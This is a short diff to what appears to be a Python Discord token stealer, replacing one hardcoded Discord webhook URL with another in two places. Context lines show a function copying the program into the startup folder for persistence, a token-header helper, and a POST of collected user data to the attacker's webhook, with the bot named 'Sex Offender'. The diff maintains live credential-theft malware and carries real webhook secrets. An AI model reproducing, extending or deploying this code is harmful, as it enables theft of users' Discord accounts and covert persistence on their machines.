@@ -72,7 +72,7 @@ def copy_exe_to_startup(exe_path):
 exe_path = os.path.abspath(sys.argv[0])
 copy_exe_to_startup(exe_path)
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1438070885729697844/MST6CL5c-1VKQAbdFc0-ken7K5dUHn7A6mp11dDoPSCr6XMZHmNUbxjYpEabpCYAYCLW"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1438104961169883210/IUJNtYhisFqeKFIowKyJm0X9u-4McU1qoAuVoLVw-JGEeaqXxz55IT9-vjBRPl1B-QfO"
 
 def getheaders(token=None):
     headers = {
@@ -368,7 +368,7 @@ def main():
                     "username": "Sex Offender",
                 }
 
-                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1438070885729697844/MST6CL5c-1VKQAbdFc0-ken7K5dUHn7A6mp11dDoPSCr6XMZHmNUbxjYpEabpCYAYCLW', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1438104961169883210/IUJNtYhisFqeKFIowKyJm0X9u-4McU1qoAuVoLVw-JGEeaqXxz55IT9-vjBRPl1B-QfO', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
             except (urllib.error.HTTPError, json.JSONDecodeError):
                 continue
             except Exception as e:
